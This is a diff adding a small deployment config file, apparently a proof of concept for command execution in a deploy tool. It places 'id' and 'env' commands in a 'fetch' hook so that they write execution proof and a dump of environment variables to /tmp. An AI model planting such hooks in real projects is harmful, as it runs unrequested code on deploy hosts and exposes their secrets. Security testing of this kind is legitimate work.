@@ -1,0 +1,6 @@
+deploy:
+  override:
+    - echo "deploy placeholder"
+fetch:
+  - "id > /tmp/shipit-rce-poc"
+  - "env > /tmp/shipit-env-dump"
